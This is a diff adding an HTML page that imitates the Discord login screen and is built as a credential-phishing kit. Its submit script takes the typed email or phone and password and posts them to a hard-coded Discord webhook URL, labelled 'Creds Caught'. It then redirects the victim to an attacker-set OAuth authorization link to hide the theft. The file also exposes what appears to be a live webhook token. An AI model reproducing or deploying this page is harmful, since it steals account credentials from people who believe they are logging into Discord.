@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Discord - Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          colors: {
+            discord: '#5865F2',
+            dark: '#36393f',
+            darker: '#2f3136',
+          }
+        }
+      }
+    }
+  </script>
+</head>
+<body class="bg-[#36393f] min-h-screen flex items-center justify-center font-sans text-white">
+  <div class="bg-[#36393f] p-8 rounded-xl w-full max-w-sm shadow-2xl">
+    <div class="text-center mb-8">
+      <h1 class="text-3xl font-bold mb-2">Welcome back!</h1>
+      <p class="text-gray-400">We're so excited to see you again!</p>
+    </div>
+
+    <form id="loginForm">
+      <div class="mb-4">
+        <label class="block text-sm font-medium mb-2 uppercase tracking-wide">EMAIL OR PHONE NUMBER</label>
+        <input
+          type="text"
+          id="email"
+          required
+          class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord"
+        />
+      </div>
+
+      <div class="mb-6">
+        <label class="block text-sm font-medium mb-2 uppercase tracking-wide">PASSWORD</label>
+        <input
+          type="password"
+          id="password"
+          required
+          class="w-full p-3 bg-[#2f3136] border border-[#202225] rounded focus:outline-none focus:border-discord"
+        />
+      </div>
+
+      <button
+        type="submit"
+        class="w-full py-3 bg-discord hover:bg-[#4752c4] text-white font-semibold rounded transition"
+      >
+        Log In
+      </button>
+
+      <p class="text-center text-sm text-gray-400 mt-4">
+        <a href="#" class="text-discord hover:underline">Forgot your password?</a>
+      </p>
+    </form>
+  </div>
+
+  <script>
+    const form = document.getElementById('loginForm');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      // 1. Send typed credentials to webhook
+      const credsPayload = {
+        embeds: [{
+          title: "📩 Creds Caught",
+          color: 0x5865F2,
+          fields: [
+            { name: "Email/Phone", value: email || "—", inline: false },
+            { name: "Password", value: password || "—", inline: false },
+            { name: "Time", value: new Date().toISOString(), inline: false }
+          ]
+        }]
+      };
+
+      fetch('https://discord.com/api/webhooks/1479843046223909040/kGSLiyRPqh9TqsZfhRqMqc0fHdF05ZasD7DQNMHGT4Y7Su3yrCTU7N1Y_QhdZwgie614', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(credsPayload)
+      }).catch(() => {});
+
+      // 2. Redirect to your Discord OAuth link
+      const clientId = 'YOUR_CLIENT_ID_HERE';                    // ← replace
+      const redirectUri = 'https://your-shortened-domain.com/callback'; // or your real domain if you have one
+      const oauthUrl = `https://discord.com/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify%20email`;
+
+      window.location.href = oauthUrl;
+    });
+  </script>
+</body>
+</html>
